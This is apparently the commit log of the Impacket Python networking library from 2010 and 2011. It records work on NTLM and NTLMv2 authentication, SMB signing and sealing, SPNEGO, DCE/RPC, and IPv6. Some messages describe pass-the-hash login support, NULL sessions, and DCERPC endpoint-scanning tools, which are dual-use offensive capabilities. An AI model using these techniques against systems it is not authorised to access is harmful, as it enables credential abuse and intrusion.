Date:   Fri Jun 24 23:03:47 2011 +0000

    Added functions for the ongoing sealing/signing stuff:
    MAC()
    SEAL()
    SIGN()
    SIGNKEY()
    SEALKEY()

commit a1f700b7b684bf66ad78f339910551b1c175c598
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 24 22:59:07 2011 +0000

    Left some commented lines for the ongoing work of supporting signing and sealing with all the NTLM* flavors

commit 6ed442d36e5c4c0aee3c7b8c5a75f818103eb4af
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 24 22:56:26 2011 +0000

    Lowering the timeout value in case the target host dies in the middle of the connection

commit e212f513ec24c44da2fbfa81a4a5bcc96f6d450b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 24 15:40:57 2011 +0000

    1. Moved all the NTLMSSP logic into ntlm.py where they belong.
    2. Created high level functions getNTLMSSPType1 and getNTLMSSPType3 that are used by smb now (and in the future dcerpc)

commit 37eeabe4d230bca843c0f1f9e1e34fac6c963223
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 23 23:05:33 2011 +0000

    Checking of more flags in place. Next step is to take all the NTLMSSP out to ntlm where it should belong so other modules (e.g. dcerpc) can use the same code

commit ae79e43b7d846de8c67a1f1e5d467388bc5e49d4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 23 22:23:57 2011 +0000

    Adding domain to get_credentials and all the instances of login

commit fb1fc0b4e7b7b493add39dcc84d08ae260875648
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 23 21:34:36 2011 +0000

    MessageSignature structures for future use on signing and sealing

commit 5763b0c41a2a4f06ffec272ce8df7df0b42876f8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 23 20:54:38 2011 +0000

    Adding domain to set_credentials and SMBTransport

commit 8dc369897c4eaeae226e6a1818ab44ea52c5e166
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 23 20:15:28 2011 +0000

    Adding domain to set_credentials and SMBTransport

commit 65c78e6d46c8dc6fefc19b39113a036d50016db8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 23 17:31:50 2011 +0000

    Changed all instances of AF_INET for a getaddrinfo() so we can handle IPv6 addresses

commit 88f886a362518a70018719192f8f97226df32ed5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 23 14:20:18 2011 +0000

    1. Removed md5, no longer needed
    2. Added verification of the returned flags when negotiating capabilities, so the right encryption key is generated (128, 56 or 40 bit)

commit 5fa8d125620a5812314a55bb77474ff9a1e35382
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 22:17:22 2011 +0000

    0008-Add-opdump-a-tool-for-scanning-for-operations and
    0009-opdump-handle-closed-connections-properly from Catalin.
    Thanks!

commit f6e953b9414452624435c2f3d89c94911d084cc4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 22:15:20 2011 +0000

    0007-Add-ifmap-a-tool-for-scanning-for-listening-DCERPC from Catalin

commit 84b0e4aa38d66ac55635ad34698835de0146c731
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 21:56:24 2011 +0000

    0006-Implement-Remote-Management-Interface-in-particular from Catalin

commit 4aff752ffb544b91087625f3647625a15db3ac47
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 21:52:31 2011 +0000

    0004-Make-an-Exception-subclass-specific-to-dcerpc-for-ex and
    0005-Fix-parsing-of-the-BindAck-response-and-check-result from Catalin

commit dbb6ee5415ee1999cea0eb1b19dcb5af0f5545cf
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 21:36:20 2011 +0000

    Accidentally committed this. Reverting back. Still pending solving the issue of establishing a good connection against newer OSes where *SMBSERVER doesn't work anymore. In any case, I don't think this is the right place to patch tihs.

commit 5f5f170fe35c02aa6d0b6b27d1408419c5e82897
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 21:15:43 2011 +0000

    0003-Add-some-more-UUID-parsing-formatting-helpers from Catalin

commit f4c271a9616ee6aff88b0dc0d7b255f9419f6199
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 21:12:25 2011 +0000

    0002-Move-KNOWN_UUIDS-to-module-scope-so-other-modules-ca from Catalin

commit fe139b2ef4d323e9ddc9c3134ce2b769e92aedbc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 21:07:04 2011 +0000

    0001-Fix-some-typos-in-the-KNOWN_UUIDS-list.patch from Catalin

commit 8e3c1cf68bdd5c53c61b4e80c44e1d1205eac1b5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 20:13:00 2011 +0000

    1. Share's comments (remarks) were not aligned with the sharename

commit 4935f064c9862c5b62e3868ec9394b1498d1f5b5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 19:40:05 2011 +0000

    ntlm USE_NTLMv2 back to True
    2. neg_session must use self._dialects_parameters['Capabilities'] to decide extended security

commit e5ffe53c4f5b10af9b31569908fe3bd293fd0e7d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 18:53:01 2011 +0000

    Clarifications to run the tests right

commit 1feb7e9c15f1867fd68351f70522406e373dd191
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 18:50:49 2011 +0000

    Signature related stuff.
    Added the aTime to the av_pairs if not received by the server (old Windows)

commit 25a4110d0229fab8e6d6c0649352716f9184ac5c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 14:36:00 2011 +0000

    Support for SPN name validation added

commit 3a83810cf7072eb3064bfff699aa937bc33864a8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 14:16:07 2011 +0000

    Now the library signs SMB if it is ENFORCED by the server (Local Security Policy -> Local Policies -> Security Options -> Digitally sign communications (always))

commit cceb77a570548c175e31b29c224b783285b1c9ea
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 14:11:11 2011 +0000

    Fixed setting the right values for the computeReponse* response

commit 6d2611f2aea73f3889a9df01cc49b403fa7de57a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 13:36:49 2011 +0000

    This was the problem why NTLM2 wasn't working. Now all the auth methods work

commit cfc32b8a328e04eb08495d9509713c98d8c3aca1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 12:33:38 2011 +0000

    Changed the arguments for computeResponse* based on the changed previously made

commit 49b24eac42d3fc5d479050e798a52388e5aff191
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 01:51:04 2011 +0000

    SMB Signature is working.. verified. I'll keep it disabled tho.

commit 6c6e96f623e412f6953cf12026ccaf58aaf59517
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 01:18:33 2011 +0000

    1. Ok.. almost done with the NTLM saga. Depending on the USE_NTLMv2 global variable, when calling computeResponse, it will either go to NTLMv1 or NTLMv2 (and calculate the different values depending on the flags set, eg: NTLM2). There's an special case when authentication doesn't work against a Win7 and it is when using NTLMv1 with extended security, I guess that has to do with the fact that the other side is expecting NTLMv2 instead of NTLM2. Further research is necesary (if someone knows this let me know).
    2. SMB signing is now working but disabled. It will be enabled in the future only if the target requires it (win 2008)

commit b8549c9a6330e6dbd02cc4c50e1afa0185d93005
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 21 23:20:16 2011 +0000

    Fixed minor things.

commit ced6159a7055ca68a093591a7a42dee724a60be2
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 21 22:45:34 2011 +0000

    1. Checked everything with the MS-NLMP examples. Just one (4.2.2.2.2 with LM_KEY) to fix (not a big deal actually)
    2. Added the USE_NTLMv2 global variable to ntlm.py since that's not something to be negotiated by the client/server
    3. computeResponseNTLMv2 changed to computeResponseNTLM2 (better name, reflecting what's going on actually).
    4. Commented out a lot of things on NTLMAuthChallengeResponse.fromString(). I don't think we need it, but left there just in case (too much for today)

commit 633c27fd6d7de150b381929a2b919a6237870c77
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 21 22:38:34 2011 +0000

    added serverName with the AVPAIRS in there

commit a9a26927311e9c8f471348e0de01cb4e0aea0167
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 21 22:36:27 2011 +0000

    Test case based on MS-NLMP, section 4 - Protocol Examples

commit 5dd17c26469761865b318ace90e310ff491de8a0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jun 20 22:49:17 2011 +0000

    Just commented the signature check. SingSMB is correct, the problem seems to be when generating the encryptedRandomSessionKey. Maybe KXKEY is not doing things right. Gotta research more

commit 3e2c341125f177e39b3cfb6909b0f66c65d587f1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jun 20 21:58:07 2011 +0000

    1. Added more stuff for SMB signing. Still not activated since it's not yet working

commit 4e5c71b6ff81bab243b7bf209a7293ab5d23afd3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jun 19 22:07:56 2011 +0000

    1. *_Data structures base class must be Structure (it was working anyways, just for the fact of putting things right)
    2. rename() and mkdir() now uses Structure. Added classes for those and changed functions

commit f8ed3e7fec1dd144be99ca1bc43f7fd89501be10
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jun 19 21:26:49 2011 +0000

    LogOffAndX now with structure

commit 56b827e6f6be16a24bac7237b22d9d58d51c86b2
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jun 19 21:14:03 2011 +0000

    Removed unused function __decode_smb

commit 258624b87c93504e8c962b07d9847d1adbe4198c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jun 19 21:06:15 2011 +0000

    1. Removed TRANSHeader class, replaced with structure
    2. Removed use of TRANSHeader in dcerpc/transport, replaced with SMBTransactionResponse_Parameters structure
    3. Created SMBTransaction* structures in smb.py
    4. Changed TransactNamedPipe to use the new structs

commit ef72ba9a2a82ba580cd1200520c4415e7f4a31d4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jun 19 01:43:40 2011 +0000

    1. Implemented SMB_COM_TRANSACTION using structure
    2. Changed send_trans to do so
    3. Removed __trans. Old and useless
    4. Removed __browse_servers, browse_domains and browse_servers_for_domain. Those methods didn't work, and, besides, should be implemented in SRVSVC (setting a ODO there)

commit 68fcb42731637069c641de1244cb98a63166361d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jun 19 00:28:20 2011 +0000

    SMB_COM_CLOSE with structure now

commit e067cae466bec2ab0e9126254f4c11528f9b4c8c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jun 19 00:09:23 2011 +0000

    stor_file now uses write_andx with structure. Still left stor_file_raw

commit a774d94fc22a13a912a84c3d16cb482ac0ae4a07
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 18 22:39:52 2011 +0000

    One NT Error added

commit 0fd5072ec1671f8cbd7287c7baa2141e152cf644
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 18 22:36:30 2011 +0000

    Variable initialization missed

commit d45e7a5fcddc308e092a5c1a24ea3cf3a0b340ae
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 18 22:27:14 2011 +0000

    1. Removed NTLMDialect class. Now replaced by _ntlm_dialect_parameters and _ntlm_dialect_data (all with structure)
    2. Changed all references of _ntlm_dialect to the proper new schema
    3. Added parsing of ServerName and DomainName in SMBDialectData. Extra careful data might not be there (e.g. some Unix systems)
    4. Updated the get_server_time method now using _ntlm_dialect_parameters

commit e45987be77ad5c44677205b92e9a4e5c90295b9b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 18 18:22:02 2011 +0000

    removed set_key_odd_parity. Not used at all

commit 5c711c2e20d337feb25ac5f196de07f38fa45ff2
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 18 18:16:00 2011 +0000

    Some beautifying of the source code.

commit 840cbd614195d3ed53ce7a91b96d2816524e0828
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 18 17:02:31 2011 +0000

    If hashes were passed to a dcerpc transport, now pass the hash is going to be performed as well (only in NTLMv1 as this is the only auth supported by dcerpc)

commit b06f86f6ec492fc59acdc3fa8cdc93a8da857053
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 18 00:54:10 2011 +0000

    Fixed correctly handling NULL sessions in extended mode

commit 32799720ab604db2a86d5428fcbc276f0f38b135
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 18 00:38:13 2011 +0000

    Fixed correctly handling NULL sessions in login_standard

commit a503056226a222db1a7d8eee40892a7d4d9238c9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 17 22:55:44 2011 +0000

    1. Removed the SMBExtended class. That shouldn't have ever been there.

commit 2a72b1bb7056626cdfba62c1f631f502546d5b3a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 17 22:50:41 2011 +0000

    1. Removed login_pass_the_hash and login_plaintext_password functions. No longer needed
    2. Turned on by default extended_security. Now the library tries by default to connect to the targets using extended security and NTLMv2.

commit a5ff88db15debdb2c3668192710f5f2c601d721a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 17 22:48:07 2011 +0000

    1. Added some NT Errors since we get those ones when using extended security
    2. self._dialect_data to be the default in the future, still most of the code using self._ntlm_dialect
    3. Remove an assert since now we do NTLMv2
    4. Session key generation for NTLMv1 now in place
    5. Reorganized code in login_extended
    6. login() now goes to either login_standard or login_extended, and passes the hash right away to both functions.

commit b50d20cdfe81306623e3377103545506c636b4e4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 17 22:42:19 2011 +0000

    1. NTLMv1 (simplified) algorithm written. It actually calls some of the previous functions.
    2. Minor changes to functions names

commit 18c6bac732bfbc141f6759db15783d3a313ce717
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 17 19:59:19 2011 +0000

    1. Changed NewSMBPacket structure so it now has the SecurityFeatures (signing) field (in preparation for SMB signing)
    2. Added SMB_SIGNING constants
    3. Added singSMB(), does nothing now

commit efed798f2058074eb638d6c79efe8ae9dc789221
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 17 19:54:57 2011 +0000

    1. Making pass the hash work with NTLMv2 - done

commit afe54eff4dae3c2d3a1dca34257612d4487febe4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 17 17:08:26 2011 +0000

    1. Now the client requests KEY EXCHANGE and INFO TARGET (the later needed for NTLMv2)
    2. Added the logic to call the KEY EXCHANGE functions previously committed to ntlm.py

commit b21111af0fa0f3b89f56e49d469e071a39615ec0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 17 17:06:54 2011 +0000

    1. NTLMAuthChallenge now correctly handles servers that don't send Version Information
    2. NTLMSSP_KEY_EXCHANGE now supported. Key is calculated and send to the target Server
    3. Generate a FILETIME structure if the server doesn't send one, to complete NTLMv2 auth.

commit c9dbcb85617853952cbef5456874686bf43aade8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 17 02:22:05 2011 +0000

    1. Completed the NTLMv2 support when extended security is used. Still not default.

commit ca6e0be0a36a4a0999bd5586fcbc1e9a96f8b4ab
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 17 02:15:43 2011 +0000

    1. Minor fixes on AV_PAIR so unpack/pack works well
    2. Fixed the NTLMv2 algorithm, now it works.

commit 861befa380623e13ebe7ebb2e11293c74f2d6f66
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 16 23:14:33 2011 +0000

    Added handling of NTLMv2 (still not working) when treating extended_security

commit 127dfa5ea29c06c3218237e6e5eb9368c0adcd4b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 16 23:12:22 2011 +0000

    Extra verifications just in case there's no TargetInfoFields in the packet

commit cab17fe14299108b156cc5be2cac6de5b15c17b9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 16 23:09:20 2011 +0000

    1. Added AV_PARIS structure
    2. Added handling of AV_PAIRS to NTLMAuthHeader
    3. Added NTLMv2 algorithm (still not working)

commit a072ed355cd3e08b18651a609706d8fad0192afa
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 16 19:19:49 2011 +0000

    Completed the NTLMAuthChallenge structure. We need some items there to do NTLMv2

commit 6e06bed8f7cf8c1e0aa43184ac23d3eb6581fb76
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 15 22:26:10 2011 +0000

    Defined TypesMech to map string names to UUIDs

commit c07fa29622702e85e44fdf6777aadd5a4f4557bc
Author: gera@corest.com <gera@corest.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 15 17:39:50 2011 +0000

    binascii.crc32() can return negative numbers, they must be properly packed as integer (not unsigned integer)
    
    also changed to integer (instead of long) so in 64 bits platforms they are still packed as 32 bits

commit 10c548427896cf75765b715d957ed838e69c9324
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 15 02:17:00 2011 +0000

    1. Fixed the INVALID_PARAMETER issue.. the Uid was missing from the previous packet. All done.. but still disabled until further testing is done.

commit 5faa5c8864d6fa09e87f52c24fc793045ba86326
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 15 01:20:02 2011 +0000

    1. Implemented SPNEGO_NegTokenResp()
    2. Fixed bug on SMBSessionSetupAndX_Extended_Data SecurityBlobLength calculation
    3. Added SMBSessionSetupAndX_Extended_Response structures
    
    Still all the new stuff is disabled. Pending figuring out why the server is responding with INVALID_PARAMETER when sending the last NegTokenResp. Could be a flags problem.

commit 5ecff4660a1eb2ce7c114ca6d73b476dcb4ab5eb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 14 21:47:47 2011 +0000

    1. Added SMB FLAGS and FLAGS2
    2. Changed existing ones (LONG_FILENAME and USE_NT_ERRORS) to (LONG_NAMES and NT_STATUS) per specification's document

commit cb6cac766a59ab16627aa11d468ccadee83d57b0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 14 20:51:48 2011 +0000

    More stuff on extended security:
    
    1) Completed the NegTokenInit with the mechToken
    2) Started working on the login_extended, one packet more to go

commit 210fc6633f6efabb8d8c06b5002e56ad42864aea
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 14 14:38:17 2011 +0000

    In preparation for Extended Security authentication support:
    1) Added GSS-API structures and functions
    2) Added SPNEGO structures, now it supports NegTokenInit

commit 355df3118e1456e97a6df3dabc70a321f60fd94b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jun 12 22:11:06 2011 +0000

    In preparation for Extended Security authentication support:
    1) Added Extended Security structures
    2) neg_session can be set to request Extended Security
    3) Non extended security structures created and parsed, although NTLMDialect is still used overall (to maintain compatibility)
    4) login_extended defined, but yet implemented (it shouldn't reach that code ever)

commit cf1da46024be44937939551469f7d475ccdef47c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jun 12 00:36:19 2011 +0000

    Flags doesn't exist, it's Flags1

commit dd7c6862d2062e57d7a569823976fe3686ac2d4d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jun 12 00:27:38 2011 +0000

    SMB neg_session now uses NewSMBPacket

commit 900977fba358a311abc285d5f8d8e03def493604
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 11 23:39:34 2011 +0000

    Added info command to display results for NetrServerGetInfo

commit e0ffd4153127fa5b495cde48b3f0089850c50ed8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 11 23:31:48 2011 +0000

    Added support for NetrServerGetInfo(Level2)

commit 72887f78b45c52af3ce0b539fc5ffd075b4741bd
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 11 22:33:16 2011 +0000

    List of shares now uses srvsvc

commit 0f776b019359dfcde29617800d372e8ffc8cdeed
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 11 22:28:54 2011 +0000

    Added the ability to specify an already connected SMB session to the transport avoiding creating an extra connection

commit ae61854b6ca0b974908b6f37acb6efb352335c7f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 11 22:16:06 2011 +0000

    Copyright change

commit 32e61e8b683dba375703e1cc4663f46d35ed14f4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 11 22:07:52 2011 +0000

    Added get_remote_host method

commit 980dd754cfa1e4577366b4f73e2ddb70a321de31
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 11 21:53:52 2011 +0000

    Added support to specify the remote_name via the open command (from Vista on, *SMBSERVER doesn't work anymore)

commit 38e79050a88e3fc7fe147cdece674d2de29459cc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 11 20:55:59 2011 +0000

    Added support for NetrShareEnum(Level1) and NetrShareGetInfo(Level2)

commit efc2bb662d71ff720af4c1fe8076844fbe82f378
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 8 02:37:58 2011 +0000

    Updated maintainer info

commit a11cc11a999c1fcc21a0a8b32fd452cb6b9b4395
Author: pditincho@gmail.com <pditincho@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 1 15:10:32 2011 +0000

    Addition of test suites for IP6_Address, IP6 and ICMP6. Several bugfixes and typographic corrections.

commit 98ed9275de29d22a47ae9e395cd6c2de849ad7b4
Author: pditincho@gmail.com <pditincho@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu May 26 14:48:34 2011 +0000

    Addition of support for IP6, ICMP6 and NDP packets. Addition of IP6_Address helper class.

commit f3fb8846cb816e9632aee58755de7df38d7191c9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Feb 10 16:35:15 2011 +0000

    No need to change flags when asking for shares, reverting back to the ones we had before

commit a70de4de81bcf9280af9c32e15b3289d0688e83d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Feb 10 16:33:06 2011 +0000

    Added support to specify domain when loggin in

commit ad26f3ae9bc87399bf25742dde35e12290e7a0db
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Feb 10 16:30:35 2011 +0000

    Added support to specify domain when loggin in

commit b8b355c79f7625ebe59dc94235151762be3d23dc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Feb 8 01:46:25 2011 +0000

    Support for NULL login (just put login)
    Now it correctly handles open {host,port}

commit 2153773af3c0854ee22533bbda69438183adedee
Author: jigermano@gmail.com <jigermano@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Feb 2 21:26:56 2011 +0000

    Issue 3: Bad SessionError message
    Issue 4: Copy with smb doesn't work
    Issue 5: Reference to an undefine ERRBROWSE
    Issue 6: wrong exceptions being raised

commit 1648086471439876f38bbb3a8f980b7e28c04d4b
Author: jigermano@gmail.com <jigermano@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Feb 2 21:19:50 2011 +0000

    Fix Issue 2: NTLMAuthHeader should be used for DCE/RPC only, forgot a simple unittest checking the headers

commit f8cc713efe46088bce166b47d377493144964595
Author: jigermano@gmail.com <jigermano@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Feb 2 21:10:49 2011 +0000

    Fix Issue 2: NTLMAuthHeader should be used for DCE/RPC only

commit f70f0604a21bd1faad2f5ba06d2f95e56ed126ae
Author: gera@corest.com <gera@corest.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 24 14:39:58 2011 +0000

    at some point in time NTLM Auth and Encryption got broken when synchin stuff
    from Core's trunk. This commit fixes it, and adds something else, which we
    are not 100% sure, but works: data in a DCERPC packet can't be empty, we
    add 4 bytes when it is.

commit c346847c1ac68e99f1883576b2cc81070795a550
Author: gmoreira@gmail.com <gmoreira@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 18 17:56:45 2010 +0000

    a method for returning the reserved TCP header nibble was added

commit dd48420a715d807cebd1101ccf2c146e7c6aa3c5
Author: gmoreira@gmail.com <gmoreira@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 4 19:33:46 2010 +0000

    We modify RadioTap class to improve performance creating RadioTapField array at static time.

commit f180573798c8862202e189596345c7f7e1496e80
Author: gmoreira@gmail.com <gmoreira@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Aug 3 16:05:15 2010 +0000

    Update to Core impact internal repository

commit d0a276794aa53c96a8d32068c3e2e3084bc3eff5
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 8 17:48:44 2010 +0000

    * Fixed keymanager problem in decoders
    * Fixed address place where the BSSID address was used. The BSSID address place is based on fromDS and toDS.
    * Fixed test-WEPDecoder.py, it used the incorrect address to add the key in the keymanager.
